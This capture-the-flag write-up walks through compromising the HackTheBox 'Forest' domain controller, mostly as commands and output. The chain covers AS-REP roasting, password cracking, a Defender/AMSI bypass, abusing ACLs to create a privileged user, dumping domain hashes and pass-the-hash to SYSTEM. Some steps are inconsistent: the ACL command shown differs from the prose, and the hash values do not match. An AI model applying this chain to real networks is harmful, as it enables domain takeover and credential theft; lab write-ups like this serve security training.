@@ -1,0 +1,216 @@
+# Recon
+Our nmap scan shows the target is running Windows Server 2016, with open ports for DNS, Kerberos, and LDAP - indicating this is a Domain Controller for an Active Directory environment.
+```shell-session
+knytecode@parrot:~$ sudo nmap -sC -sV -oA scans/nmap -Pn $ip                                                                                                                                    
+Nmap scan report for 10.10.10.161                                                                                                                                                     
+Host is up (0.10s latency).                                                                                                                                                           
+Not shown: 989 closed ports                                                                                                                                                           
+PORT     STATE SERVICE      VERSION                                                                                                                                                   
+53/tcp   open  domain       Simple DNS Plus                                                                                                                                           88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-11 14:23:38Z)                                                                                            
+135/tcp  open  msrpc        Microsoft Windows RPC                                                                                                                                     
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h39m31s, deviation: 4h02m32s, median: 19m29s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2021-07-11T07:23:48-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-07-11T14:23:47
+|_  start_date: 2021-07-11T14:20:32
+```
+
+We should first use `ldapsearch` check if the LDAP service allows anonymous binds. The `-x` flag sets anonymous authentication, and the `-b` flag sets the basedn to start from.
+```shell-session
+knytecode@parrot:~$ ldapsearch -h 10.10.10.161 -p 389 -x -b "dc=htb,dc=local"
+
+# htb.local
+dn: DC=htb,DC=local
+objectClass: top
+objectClass: domain
+objectClass: domainDNS
+distinguishedName: DC=htb,DC=local
+instanceType: 5
+whenCreated: 20190918174549.0Z
+whenChanged: 20200317074220.0Z
+subRefs: DC=ForestDnsZones,DC=htb,DC=local
+subRefs: DC=DomainDnsZones,DC=htb,DC=local
+subRefs: CN=Configuration,DC=htb,DC=local
+```
+It looks like null bind is enabled, since we were able to query the domain without credentials. We can use [windapsearch](https://github.com/ropnop/windapsearch) to enumerate AD objects using LDAP.
+```
+knytecode@parrot:~$ windapsearch --dc 10.10.10.161 -m users
+
+OU=Service Accounts,DC=htb,DC=local
+CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local
+OU=Security Groups,DC=htb,DC=local
+```
+This found over 300 objects, including the service account `svc-alfresco`. A quick google brings us to some [documentation](https://docs.alfresco.com/process-services/latest/config/authenticate/#kerberos-and-active-directory) which states that the service needs Kerberos pre-authentication to be disabled. We can take advantage of this by requesting the encrypted TGT for this user. The TGT (Ticket Granting Ticket) contains some data that is encrypted with the user's NTLM hash, which can be subjected to an offline brute-force attack in order to get the `svc-alfresco` password.
+
+![AS_REP message containing the TGT](images/as_rep.png)
+
+This technique is known as AS_REPRoasting, as the TGT containing the user hash is provided in the AS_REP message from the Key Distribution Center (Domain Controller).
+
+![Kerberos authentication](images/kerberos.png)
+
+# Foothold
+Since pre-authentication is disabled for `svc-alfresco`, we can use the `GetNPUsers` impacket script to request the TGT ticket and dump the user's NTLM hash.
+```shell-session
+knytecode@parrot:~$ impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+[*] Getting TGT for svc-alfresco
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:92464b43f3a8f3bfd1d4b56c7e587c57
+```
+We can now use hashcat to crack the obtained NTLM hash, revealing the password as `s3rvice`.
+```
+knytecode@parrot:~$ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:6d1c55b344fc86ea5010d3966fb68b9f:s3rvice
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, AS-REP
+Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:6d1c55b344fc86...ce88f5
+Time.Started.....: Sun Jul 11 18:08:19 2021 (3 secs)
+Time.Estimated...: Sun Jul 11 18:08:22 2021 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  1302.8 kH/s (6.14ms) @ Accel:64 Loops:1 Thr:64 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 4096000/14344385 (28.55%)
+Rejected.........: 0/4096000 (0.00%)
+Restore.Point....: 4079616/14344385 (28.44%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: s9039554h -> s/nd/0s
+```
+Since port 5985 is open, we can use Evil-WinRM to check if the user can login remotely over WinRM. This works, giving us a remote powershell and the user flag.
+```
+knytecode@parrot:~$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+
+Evil-WinRM shell v2.4
+PS C:\Users\svc-alfresco\Documents> whoami
+htb\svc-alfresco
+PS C:\Users\svc-alfresco\Documents> cd ../Desktop
+PS C:\Users\svc-alfresco\Desktop> type user.txt
+e5e4e47ae7022664cda6eb013fb0d9ed
+```
+
+# Privilege Escalation
+Now that we have valid credentials, we can use the awesome tool [BloodHound](https://github.com/BloodHoundAD/BloodHound) to visualise the AD environment and look for privilege escalation paths. 
+
+_"BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify."_
+
+First, we must run a script to gather data about the various objects (computers, users, groups .etc) in the domain using our new credentials. This outputs some JSON files which we can then import into BloodHound.
+```
+knytecode@parrot:~$ bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161
+INFO: Found AD domain: htb.local
+INFO: Connecting to LDAP server: FOREST.htb.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Connecting to LDAP server: FOREST.htb.local
+WARNING: Could not resolve SID: S-1-5-21-3072663084-364016917-1341370565-1153
+INFO: Found 31 users
+INFO: Found 75 groups
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: EXCH01.htb.local
+INFO: Querying computer: FOREST.htb.local
+INFO: Done in 00M 34S
+```
+Now we open up BloodHound and import the JSON files. Looking at the owned `svc-alfresco` user, we can see that it's a member of 9 groups through nested membership.
+
+![Bloodhound](images/bloodhound1.png)
+
+One worth noting is the `Account Operators` group, which is a privileged AD group (marked by the diamond icon). Looking at the [documentation](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators), `Account Operators` can create and modify users, as well as add them to non-protected groups.
+
+Since the imported JSON data is stored in a neo4j database, we can do all kinds of interesting queries on the domain. For example, the pre-built `Shortest Path to High Value targets` query is useful to identify potential attack paths.
+
+![Shortest Path to High Value targets](images/bloodhound2.png)
+
+Looking closer, we can see the aformentioned `Account Operators` group has `GenericAll` privileges (full control) over the `Exchange Windows Permissions` group, which in turn has `WriteDacl` privileges on the domain. 
+
+![Exchange Windows Permissions group](images/bloodhound3.png)
+
+With write access to the target object's DACL (Discretionary Access Control List), you can grant yourself any privilege you want on the object. We can exploit this by adding a user to the group and giving them `DCSync` privileges.
+
+To do this, we must create a new user and add it to the `Exchange Windows Permissions` and `Remote Management Users` group.
+```
+PS C:\Users\svc-alfresco> net user knytecode abc123! /add /domain
+PS C:\Users\svc-alfresco> net group "Exchange Windows Permissions" knytecode /add
+PS C:\Users\svc-alfresco> net localgroup "Remote Management Users" knytecode /add
+```
+To aid in adding `DCSync` privilege to our user on the domain's ACL, we can import the [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon) module.
+
+_"PowerView is a PowerShell tool to gain network situational awareness on Windows domains. It contains a set of pure-PowerShell replacements for various windows net* commands, which utilize PowerShell AD hooks and underlying Win32 API functions to perform useful Windows domain functionality"_
+
+Before uploading the PowerView script, we run the Bypass-4MSI command in Evil-WinRM to evade Windows Defender.
+```
+PS C:\Users\svc-alfresco> Bypass-4MSI
+[+] Patched! :D
+PS C:\Users\svc-alfresco> upload /usr/share/windows-resources/PowerSploit/Recon/PowerView.ps1
+PS C:\Users\svc-alfresco> Import-Module ./PowerView.ps1
+```
+Now we can use the `Add-ObjectACL` function from PowerView to give the new user DCSync rights.
+```
+PS C:\Users\svc-alfresco> $Pass = ConvertTo-SecureString 'abc123!' -AsPlainText -Force
+PS C:\Users\svc-alfresco> $Cred = New-Object System.Management.Automation.PSCredential('htb\knytecode', $Pass)
+PS C:\Users\svc-alfresco> Add-DomainGroupMember -Identity 'Domain Admins' -Members 'knytecode' -Credential $Cred
+```
+We can now run the Impacket `secretsdump` tool with our new user to reveal the NTLM hashes for all domain users.
+```shell-session
+knytecode@parrot:~$ impacket-secretsdump htb/knytecode@10.10.10.161
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+Password: <abc123!>
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+```
+Finally, we can use the `local\Administrator` hash to login via `psexec`, getting us the root flag.
+```
+knytecode@parrot:~$ impacket-psexec administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.161.....
+[*] Found writable share ADMIN$
+[*] Uploading file UjifQHry.exe
+[*] Opening SVCManager on 10.10.10.161.....
+[*] Creating service zHNc on 10.10.10.161.....
+[*] Starting service zHNc.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+C:\Windows\system32>cd C:/Users/Administrator/Desktop
+
+C:\Users\Administrator\Desktop>type root.txt
+f048153f202bbb2f82622b04d79129cc
+```
